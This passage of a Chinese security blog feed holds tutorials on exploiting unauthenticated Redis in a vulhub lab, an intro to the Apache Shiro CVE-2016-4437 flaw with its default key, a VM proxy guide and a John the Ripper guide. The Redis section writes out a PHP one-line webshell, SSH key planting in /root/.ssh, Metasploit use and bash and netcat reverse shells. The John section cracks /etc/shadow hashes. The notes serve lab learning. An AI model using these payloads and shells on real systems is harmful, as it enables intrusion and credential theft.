src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20250325085748429.png" alt="image-20250325085748429"></p><p>我们用nmap扫一下靶机，也可以看到6379端口打开了。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -sV 192.168.192.132 -p 1-65535</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20250325090133919.png" alt="image-20250325090133919"></p><p>浏览器访问看看，能打开就行</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20250325090518098.png" alt="image-20250325090518098"></p><h4 id="攻击机设置">攻击机设置</h4><p>安装redis-cli远程连接工具</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wget http://download.redis.io/redis-stable.tar.gz</span><br></pre></td></tr></table></figure><p>然后解压，进入该目录进行编译，等待完成。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cd redis-stable</span><br><span class="line">make</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20250325091518998.png" alt="image-20250325091518998"></p><p>出现如上界面就说明成功了</p><h4 id="漏洞利用流程">漏洞利用流程</h4><h5 id="写入webshell">写入webshell</h5><ol><li>目标开启了web服务器,并且知道web路径(可以利用phpinfo或者错误暴路径等)</li><li>需要具有读写增删改查权</li></ol><p>用redis-cli命令远程免密登录redis主机</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"># 无密码登录命令</span><br><span class="line">redis-cli -h 目标主机IP</span><br><span class="line"># 有密码登录命令</span><br><span class="line">redis-cli -h 目标主机IP -p 端口6379 -a 登录密码</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20250325091905278.png" alt="image-20250325091905278"></p><p>这样就说明成功了，</p><p>redis操作命令</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">info  #查看redis的信息和服务器信息</span><br><span class="line">flushall 删除所有数据</span><br><span class="line">del key  删除键为key的数据</span><br><span class="line">get key  获得参数key的数据</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">config set dir /var/www/html  #将shell移到网站默认根目录</span><br><span class="line">config set dbfilename redis.php #创建shell文件</span><br><span class="line">set webshell &quot;&lt;?php eval($_POST[1]); ?&gt;&quot;  写入一句话木马，然后蚁剑连接</span><br><span class="line">或者</span><br><span class="line">set x &quot;\r\n\r\n&lt;?php eval($_POST[1]); ?&gt;\r\n\r\n&quot;</span><br><span class="line">save</span><br></pre></td></tr></table></figure><p>由于靶机没有开启web服务，所以就不演示了。</p><h5 id="使用py脚本执行远程命令">使用py脚本执行远程命令</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">git clone https://github.com/vulhub/redis-rogue-getshell.git</span><br><span class="line">cd redis-rogue-getshell/RedisModulesSDK/exp</span><br><span class="line">make</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20250325094921511.png" alt="image-20250325094921511"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">cd ../../   #回到redis-rogue-getshell目录下</span><br><span class="line">./redis-master.py -r 192.168.239.128 -p 6379 -L 192.168.239.128 -P 8989 -f RedisModulesSDK/exp/exp.so -c &quot;whoami&quot;</span><br><span class="line">(第一个ip是靶机，第二个ip是攻击机,-c后面跟执行的命令)</span><br></pre></td></tr></table></figure><h5 id="ssh公私钥免密登录">ssh公私钥免密登录</h5><h6 id="原理">原理</h6><p>登陆linux有几种方式，最常用的是密码登陆和RSA key 登陆，RSA key登陆是生成一个公私对应的秘钥，然后将公钥放到linux系统的/root/.ssh/authorized_keys的文件中，我们本地客户端通过导入对应私钥进行登陆，这就是RSA key的登陆方式。</p><h6 id="为什么redis可以获取服务器的root权限呢？">为什么redis可以获取服务器的root权限呢？</h6><p>上面RSA key的登陆方式在服务器方面是要将公钥写入authorized_keys文件中的，而redis有一种持久化方式是生成RDB文件，通过持久化将公钥写入root下的authored_keys文件里，这样就将非法的公钥写到了验证文件里，后面我们拿对应私钥登陆即可。（但是这种方式需要redis是root启动的情况下使用，因为非root权限无法进入/root目录）</p><h6 id="步骤">步骤</h6><p>在攻击机中生成ssh公钥和私钥文件，密码为空</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh-keygen -t rsa</span><br></pre></td></tr></table></figure><p>进入/home/kali/.ssh目录: 将生成的公钥保存到sshkey.txt：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(echo -e &quot;\n\n&quot;; cat id_rsa.pub; echo -e &quot;\n\n&quot;) &gt; sshkey.txt</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20250325102503591.png" alt="image-20250325102503591"></p><p>使用redis-cli -h ip命令连接靶机，把sshkey.txt写入redis中</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat sshkey.txt | redis-cli -h 192.168.192.132 -x set crack</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20250325102811549.png" alt="image-20250325102811549"></p><p>然后用redis-cli连接靶机，然后更改目标服务器Redis备份路径为ssh公钥存放目录(默认为/root/.ssh)</p><p>此处因为靶场中的redis没有root权限，就不演示了</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">config set dir /root/.ssh</span><br></pre></td></tr></table></figure><p>设置上传公钥备份文件名为authorized_keys:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">config set dbfilename authorized_keys</span><br></pre></td></tr></table></figure><p>然后在攻击机上使用ssh免密码登录靶机，利用私钥就能成功登入redis服务器</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh -i id_rsa root@ip</span><br></pre></td></tr></table></figure><h5 id="使用msf进行漏洞利用">使用msf进行漏洞利用</h5><p>使用searchsploit搜索redis相关漏洞</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">searchsploit redis</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20250325104753221.png" alt="image-20250325104753221"></p><p>可以看到相关漏洞都在metasploit里</p><p>启动metasploit（注意要在root下启动，不然攻击时会报错）,然后检索redis相关exp</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">msfconsole</span><br><span class="line">search redis type:exploit</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20250325105152802.png" alt="image-20250325105152802"></p><p>看到有一个cmd利用的漏洞，使用该模块</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">use exploit/linux/redis/redis_replication_cmd_exec</span><br></pre></td></tr></table></figure><p>然后查看需要设置的参数</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">show options</span><br><span class="line">set LHOST 192.168.192.135</span><br><span class="line">set RHOST 192.168.192.132</span><br><span class="line">set SRVHOST 192.168.192.135</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20250325110217792.png" alt="image-20250325110217792"></p><p>然后运行，出现如下情况就成功了</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20250325111732432.png" alt="image-20250325111732432"></p><h5 id="反弹连接">反弹连接</h5><p>这个方法主要适用于马被杀了，或者靶机在内网之中。</p><p>常见端口监听方法</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">netcat：nc -lvp 7777</span><br><span class="line"></span><br><span class="line">msf：</span><br><span class="line">msfconsole</span><br><span class="line">use exploit/multi/handler</span><br><span class="line">set payload php/meterpreter/reverse_tcp</span><br><span class="line">set lhost 192.168.37.130</span><br><span class="line">set lport 7777</span><br><span class="line">run</span><br><span class="line"></span><br><span class="line">socat：socat TCP-LISTEN:7777 - (kali系统)</span><br></pre></td></tr></table></figure><p>常见建立连接方式</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Linux bash：</span><br><span class="line">bash -i &gt;&amp; /dev/tcp/攻击机ip/攻击机监听端口 0&gt;&amp;1</span><br><span class="line"></span><br><span class="line">netcat：</span><br><span class="line">nc -e /bin/bash 攻击机ip 攻击机监听端口</span><br></pre></td></tr></table></figure><p>这里我就演示nc和bash的配合：</p><p>攻击机进行nc监听：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -lvp 7777</span><br></pre></td></tr></table></figure><p>靶机使用bash:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bash -i &gt;&amp; /dev/tcp/192.168.192.135/7777 0&gt;&amp;1</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20250325113528895.png" alt="image-20250325113528895"></p><p>之后在监听机上就能看到</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20250325113511333.png" alt="image-20250325113511333"></p><p>然后就可以执行命令了</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20250325113712853.png" alt="image-20250325113712853"></p><p>可以看到是靶机的ip地址。</p><p>主动关闭连接直接在攻击机上exit。</p>]]></content>
    
    
    <summary type="html">🥧redis漏洞原理；【vulhub漏洞靶场】redis漏洞及redis漏洞复现；利用redis写入webshell；python脚本利用redis；ssh公钥免登录利用redis；msf利用redis；反弹shell利用redis</summary>
    
    
    
    <category term="web渗透" scheme="https://blog.m3x1.cn/categories/web%E6%B8%97%E9%80%8F/"/>
    
    
    <category term="笔记" scheme="https://blog.m3x1.cn/tags/%E7%AC%94%E8%AE%B0/"/>
    
  </entry>
  
  <entry>
    <title>Shiro反序列化漏洞全解析</title>
    <link href="https://blog.m3x1.cn/posts/78877ffd.html"/>
    <id>https://blog.m3x1.cn/posts/78877ffd.html</id>
    <published>2025-03-19T16:00:00.000Z</published>
    <updated>2025-03-20T16:03:45.135Z</updated>
    
    <content type="html"><![CDATA[<h2 id="介绍Apache-Shiro-1-2-4-反序列化漏洞（CVE-2016-4437）">介绍<strong>Apache Shiro 1.2.4</strong> 反序列化漏洞（<strong>CVE-2016-4437</strong>）</h2><p>Apache Shiro是⼀款开源安全框架，提供身份验证、授权、密码学和会话管理。Shiro框架直观、</p><p>易⽤，同时也能提供健壮的安全性。</p><p>Apache Shiro 1.2.4及以前版本中，加密的⽤户信息序列化后存储在名为remember-me的Cookie</p><p>中。攻击者可以使⽤Shiro的默认密钥伪造⽤户Cookie，触发Java反序列化漏洞，进⽽在⽬标机</p><p>器上执⾏任意命令。</p><h2 id="漏洞成因">漏洞成因</h2><p>其漏洞的核⼼成因是cookie中的身份信息进⾏了AES加解密，⽤于加解密的密钥应该是绝对保密</p><p>的，但在shiro版本&lt;=1.2.24的版本中使⽤了固定的密钥。因此，验证漏洞的核⼼应该还是在于我</p><p>们（攻击者）可否获得这个AES加密的密钥，如果确实是固定的密钥</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kPH+bIxk5D2deZiIxcaaaA==</span><br></pre></td></tr></table></figure><p>或者其他我们可以通过脚本⼯具爆破出来的密钥，那么shiro550漏</p><p>洞才⼀定存在。</p><h2 id="漏洞环境及复现">漏洞环境及复现</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"># 下载项⽬</span><br><span class="line"></span><br><span class="line">wget https://github.com/vulhub/vulhub/archive/master.zip -O vulhub</span><br><span class="line"></span><br><span class="line">master.zip</span><br><span class="line"></span><br><span class="line">unzip vulhub-master.zip</span><br><span class="line"></span><br><span class="line">cd vulhub-master</span><br><span class="line"></span><br><span class="line"># 进⼊某⼀个漏洞/环境的⽬录</span><br><span class="line"></span><br><span class="line">cd shiro/CVE-2016-4437</span><br><span class="line"></span><br><span class="line"># 启动环境</span><br><span class="line"></span><br><span class="line">docker-compose up -d</span><br><span class="line"></span><br><span class="line">#启动容器</span><br><span class="line">docker run vulhub/shiro:1.2.4</span><br></pre></td></tr></table></figure><h2 id="Shiro特征"><strong>Shiro</strong>特征</h2><p>⾸先应该判断⼀个⻚⾯的登录是否使⽤了shiro框架进⾏身份验证、授权、密码和会话管理。判断</p><p>⽅法在于：勾选记住密码选项后，点击登录，抓包，观察请求包中是否有rememberme字段，响</p><p>应包中是否有Set-cookie:rememberMe=deleteMe字段。类似于下图这样：</p><blockquote><p>\1. 未登录的情况下，请求包的cookie中没有rememberMe字段，返回包set-Cookie⾥也没有</p><p>deleteMe字段</p><p>\2. 登录失败的话，不管有没有勾选RememberMe字段，返回包都会有 rememberMe= deleteMe</p><p>字段</p><p>\3. 不勾选RememberMe，登录成功的话，返回包set-Cookie⾥有rememberMe=deleteMe字</p><p>段。但是之后的所有请求中Cookie都不会有RememberMe字段</p><p>\4. 勾选RememberMe，登录成功的话，返回包set-Cookie⾥有rememberMe=deleteMe字段，</p><p>还会有remember 字段，之后的所有请求中Cookie都会有rememberMe字段</p><p>\5. 或者可以在cookie后⾯⾃⼰加⼀个rememberMe=1，看返回包有没有rememberMe=</p><p>deleteMe</p></blockquote>]]></content>
    
    
    <summary type="html">🥧Shiro反序列化漏洞全解析;shiro漏洞成因;shiro漏洞环境及shiro漏洞复现;shiro漏洞特征</summary>
    
    
    
    <category term="web渗透" scheme="https://blog.m3x1.cn/categories/web%E6%B8%97%E9%80%8F/"/>
    
    
    <category term="笔记" scheme="https://blog.m3x1.cn/tags/%E7%AC%94%E8%AE%B0/"/>
    
  </entry>
  
  <entry>
    <title>vm虚拟机如何实现与主机共享代理实现科学上网</title>
    <link href="https://blog.m3x1.cn/posts/5892bf96.html"/>
    <id>https://blog.m3x1.cn/posts/5892bf96.html</id>
    <published>2025-03-19T16:00:00.000Z</published>
    <updated>2025-03-20T16:04:32.157Z</updated>
    
    <content type="html"><![CDATA[<h2 id="方法一：使用tun模式（推荐）">方法一：使用tun模式（推荐）</h2><p>相关文章：<a href="https://clashvmess.com/3841.html">深度解析clash开tun模式：配置与使用指南 - Clash最新教程</a></p><p>如果主机是使用代理软件走代理的话，比如clash， 可以直接使用Tun模式。Tun模式下，代理软件会创建一个虚拟网卡，主机上的进程（包括虚拟机）的网络请求都会重定向到这个虚拟网卡。这种模式拦截了所有进程的网络请求，有些进程并不遵守系统代理，比如终端, pip, docker等等，Tun模式专治这种。</p><h2 id="方法二：使用系统代理模式">方法二：使用系统代理模式</h2><p><strong>很麻烦，推荐第一种</strong></p><p>VM软件配置<br>1.VM虚拟网络编辑器<br>打开虚拟网络编辑器（方式：编辑-&gt;虚拟网络编辑器),</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/216a0bd2ce71cea38b1f4060f7fe222d.png" alt="img"></p><p>然后点击更改设置</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/b11d02909648f7584aa1ce3936623e16.png" alt="img"></p><p>2.配置VMnet8和VMnet1<br>VMnet8【子网配置】如下：</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/b4914dfc9f3dabeed102f4c586b9d7df.png" alt="img"></p><p>【NAT设置】如下：</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/0cfcf812206f19a1f412471b775de26b.png" alt="img"></p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/5637516b8ae4604ce33c42b7f64c5097.png" alt="img"></p><p>【DHCP设置】如下：（可以理解为虚拟机的ip范围， 不要跟上图配置的网关冲突了）</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/035253150ff47c67925cfeabecb99510.png" alt="img"></p><p>【VMnet1】采用默认配置就可以了，当然你也可以按照上述vmnet8的方式修改一个容易记住的ip：</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/0a544c334a48ba9745ba0c480fc19e90.png" alt="img"></p><p>四、主机IP配置<br>windows进入打开设置-&gt;网络</p><p>【2024-9-18补充】【可选START  // 表示这个这个范围是可有可无的】</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/7642faecf3cd6799ce2c0e73d8c90f4e.png" alt="img"></p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/64d182eddb6d4b654d1a3b89f0ca5508.png" alt="img"></p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/aeaecd6a90ce5b0bdbf72c3502f8f7ef.png" alt="img"></p><p>双击上述红框，然后配置如下：（这里不要跟之前的网关冲突了）</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/78c1f95ff9c312d75159e9012aee7f2d.png" alt="img"></p><p>【2024-9-18补充】【可选END   // 表示这个范围是可有可无的】</p><p>代理软件要开启【Allow LAN】：（这里要记住端口, 我的是7890）</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/11c1bd289cab27c99074b57b67ca05a6.png" alt="img"></p><p>然击后点：</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/1393a2df6b6644e3ba6a7f4a1ba42e77.png" alt="img"></p><p>记住下面的接口ip,这个ip需要在Vm虚拟机中使用， 两个都可以用</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/4bec5d2c26060c002847ed712896f740.png" alt="img"></p><p>在windows终端下输入ipconfig同样可以查到：</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/5ab320459f15a3b4338421f1c5dfe6d6.png" alt="img"></p><p>五、虚拟机代理ip配置<br>在配置代理之前需要设置网络适配器， 我们之前配置了VMnet8，在这里可以使用。</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/3799988deebfaaf7cef1b13c329631da.png" alt="img"></p><p>5.1 虚拟机上用【设置】配置代理<br>用【设置】配置代理，代理设置会影响所有图形app， 比如浏览器，shell…</p><p>但是却影响不了ssh(用ssh连接虚拟机ubuntu)终端，所以在使用ssh还需要配置代理，参考第七节。</p><p>当然这种配置也影响不了很多需要单独配置代理的app, 比如conda, pip, docker等等</p><p>进入虚拟机，配置ip,如果是Ubuntu可以参考下面的配置：(注意下图的端口，要跟代理软件的端口一致)</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/05f8d947f6ccce3f08fc91b7118ddf3d.png" alt="img"></p><p>然后可以打开浏览器看外网，或者终端：</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/896ca71206197898e7112c685fb5919f.png" alt="img"></p>]]></content>
    
    
    <summary type="html">🥧vm虚拟机如何实现与主机共享代理实现科学上网;软件代理使用tun模式;系统代理设置方法</summary>
    
    
    
    <category term="问题解决笔记" scheme="https://blog.m3x1.cn/categories/%E9%97%AE%E9%A2%98%E8%A7%A3%E5%86%B3%E7%AC%94%E8%AE%B0/"/>
    
    
    <category term="问题解决笔记" scheme="https://blog.m3x1.cn/tags/%E9%97%AE%E9%A2%98%E8%A7%A3%E5%86%B3%E7%AC%94%E8%AE%B0/"/>
    
  </entry>
  
  <entry>
    <title>linux、windows密钥暴力破解工具john的使用</title>
    <link href="https://blog.m3x1.cn/posts/b2b54c4f.html"/>
    <id>https://blog.m3x1.cn/posts/b2b54c4f.html</id>
    <published>2025-03-18T16:00:00.000Z</published>
    <updated>2025-03-19T14:19:17.023Z</updated>
    
    <content type="html"><![CDATA[<p>[TOC]</p><h4 id="什么是john">什么是john</h4><p><code>John the Ripper</code> 是一款大受欢迎的、免费的开源软件。也是一个基于字典的快速破解密码的工具，是一款用于在已知密文的情况下尝试破解出明文的破解密码软件，支持目前大多数的加密算法，如 <code>DES</code> 、 <code>MD4</code> 、 <code>MD5</code> 等。 <code>John the Ripper</code> 支持字典破解方式和暴力破解方式。它支持多种不同类型的系统架构，包括 <code>Unix</code> 、 <code>Linux</code> 、 <code>Windows</code> 、 <code>DOS</code> 模式、 <code>BeOS</code> 和 <code>OpenVMS</code> ，主要目的是破解不够牢固的 <code>Unix/Linux</code> 系统密码。</p><p>john一般是kali自带。</p><h4 id="john参数表">john参数表</h4><p><code>john</code> 命令的具体参数选项如下表：</p><table><thead><tr><th>选 项</th><th>描 述</th></tr></thead><tbody><tr><td>–single</td><td>single crack 模式，使用配置文件中的规则进行破解</td></tr><tr><td>–wordlist=FILE–stdin</td><td>字典模式，从 FILE 或标准输入中读取词汇</td></tr><tr><td>–rules</td><td>打开字典模式的词汇表切分规则</td></tr><tr><td>–incremental[=MODE]</td><td>使用增量模式</td></tr><tr><td>–external=MODE</td><td>打开外部模式或单词过滤，使用 [List.External:MODE] 节中定义的外部函数</td></tr><tr><td>–stdout[=LENGTH]</td><td>不进行破解，仅仅把生成的、要测试是否为口令的词汇输出到标准输出上</td></tr><tr><td>–restore[=NAME]</td><td>恢复被中断的破解过程，从指定文件或默认为 $JOHN/john.rec 的文件中读取破解过程的状态信息</td></tr><tr><td>–session=NAME</td><td>将新的破解会话命名为 NAME ，该选项用于会话中断恢复和同时运行多个破解实例的情况</td></tr><tr><td>–status[=NAME]</td><td>显示会话状态</td></tr><tr><td>–make-charset=FILE</td><td>生成一个字符集文件，覆盖 FILE 文件，用于增量模式</td></tr><tr><td>–show</td><td>显示已破解口令</td></tr><tr><td>–test</td><td>进行基准测试</td></tr><tr><td>–users=[-]LOGIN|UID[,…]</td><td>选择指定的一个或多个账户进行破解或其他操作，列表前的减号表示反向操作，说明对列出账户之外的账户进行破解或其他操作</td></tr><tr><td>–groups=[-]GID[,…]</td><td>对指定用户组的账户进行破解，减号表示反向操作，说明对列出组之外的账户进行破解。</td></tr><tr><td>–shells=[-]SHELL[,…]</td><td>对使用指定 shell 的账户进行操作，减号表示反向操作</td></tr><tr><td>–salts=[-]COUNT</td><td>至少对 COUNT 口令加载加盐，减号表示反向操作</td></tr><tr><td>–format=NAME</td><td>指定密文格式名称，为 DES/BSDI/<a href="https://so.csdn.net/so/search?q=MD5&amp;spm=1001.2101.3001.7020">MD5</a>/BF/AFS/LM 之一</td></tr><tr><td>–save-memory=LEVEL</td><td>设置内存节省模式，当内存不多时选用这个选项。 LEVEL 取值在 1~3 之间</td></tr></tbody></table><h4 id="etc-passed和etc-shadow文件">etc/passed和etc/shadow文件</h4><p>首先要知道 /etc/passwd文件和 /etc/shadow文件</p><p>/etc/passwd文件格式</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">root:x:0:0:root:/root:/bin/bash</span><br><span class="line">daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin</span><br><span class="line">bin:x:2:2:bin:/bin:/usr/sbin/nologin</span><br><span class="line">sys:x:3:3:sys:/dev:/usr/sbin/nologin</span><br></pre></td></tr></table></figure><p>上面数据为passwd文件的一个片段，我们可以发现每一行都被<code>分号</code>分为了<code>7部分</code>。这七部分分别为：</p><blockquote><ol><li>用户名</li><li>密码(passwd文件人人可读，所以不放明文密码，真正的密码在/etc/shadow文件中)</li><li>uid</li><li>gid</li><li>用户注释</li><li>主目录</li><li>登陆的shell类型(bash/zsh/sh等)</li></ol></blockquote><p>/etc/shadow文件格式</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">root:$6$f0EotKbw$sLAujh0EleiXNAuoph20iL517cXlcExWLATwz3xgCEyYlsIECUa9nuDdiT5/ntWfJDfxFhYGcMknkCq5Awgf20:15118:0:99999:7:::</span><br></pre></td></tr></table></figure><p>也是被分号隔开格式为：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">用户名</span><br><span class="line">密码，其中\$6\$是表示一种类型标记为6的密码散列suans fa,这里指SHA-512哈希算法，1 代表 MD5，5 代表 SHA-256，6 代表 SHA-512,salt 表示密码学中的 Salt, 系统随机生成 encrypted 表示密码的 hash,其中f0EotKbw为salt。</span><br><span class="line">“最后一次修改时间”表示的是从某个时刻起，到用户最后一次修改口令时的天数。时间起点对不同的系统可能不一样。例如在SCOLinux中，这个时间起点是1970年1月1日。</span><br><span class="line">“最小时间间隔”指的是两次修改口令之间所需的最小天数。</span><br><span class="line">“最大时间间隔”指的是口令保持有效的最大天数。</span><br><span class="line">“警告时间”字段表示的是从系统开始警告用户到用户密码正式失效之间的天数。</span><br><span class="line">“不活动时间”表示的是用户没有登录活动但账号仍能保持有效的最大天数。</span><br><span class="line">“失效时间”字段给出的是一个绝对的天数，如果使用了这个字段，那么就给出相应账号的生存期。期满后，该账号就不再是一个合法的账号，也就不能再用来登录了。</span><br></pre></td></tr></table></figure><h4 id="爆破linux用户密码实例">爆破linux用户密码实例</h4><p><strong>利用 <code>unshadow</code> 组合 <code>/etc/passwd</code> 和 <code>/etc/shadow</code> 两个文件</strong></p><p><code>unshadow</code> 命令会将 <code>/etc/passwd</code> 的数据和 <code>/etc/shadow</code> 的数据结合起来，创建 <code>1</code> 个含有用户名和密码详细信息的文件。</p><p>我们可以通过以下命令将这两个文件结合起来：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cd ~</span><br><span class="line">sudo unshadow /etc/passwd /etc/shadow &gt; test_passwd</span><br></pre></td></tr></table></figure><p><strong>使用 <code>John the Ripper</code> 破解 <code>Linux</code> 用户登录密码</strong></p><p>我们这时候还需要一个字典，由于 <code>John</code> 自带了一个字典，字典位于 <code>/usr/share/john/password.lst</code> 。当然你也可以自行去网上选择适合你的字典。</p><p>我们可以开始对Linux登录用户名和密码进行破解：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">john --wordlist=<span class="regexp">/usr/</span>share/john/password.<span class="property">lst</span> test_passwd</span><br></pre></td></tr></table></figure><p>破解结果如下：</p><p><img src="https://i-blog.csdnimg.cn/blog_migrate/23bd8f0643eccb8b765a9b0aa6ce29d0.png" alt="img"></p><p>我们可以看到， <code>test_passwd</code> 文件中存在的三个用户名 <code>root</code> ，<code>test</code> ， <code>python</code> 的密码，均被破解了。</p><p>我们可以查看破解信息：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">john --show test_passwd</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/9c612252f150ba86218bfa1af040494b.png" alt="img"></p><h4 id="出现报错：-UTF-8-No-password-hashes-loaded">出现报错： UTF-8 No password hashes loaded</h4><p>John the Ripper 正确使用方法<br>现在 John the Ripper 爆破linux的shadow文件时需要加上 --format=crypt</p><p>所以现在 John the Ripper 的使用命令为：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sudo john /etc/shadow --format=crypt</span><br><span class="line">sudo john /etc/shadow --format=crypt --wordlist=/usr/share/john/password.lst</span><br><span class="line">sudo john /etc/shadow --format=crypt --wordlist=/home/kali/Desktop/rockyou.txt</span><br></pre></td></tr></table></figure><p>原因是，如果查看合并后的文件或者没合并使用的shadow文件，并在用户名后面看到 <strong>$y$</strong>，则表明密码已使用 yescrypt 进行哈希处理。</p><p><img 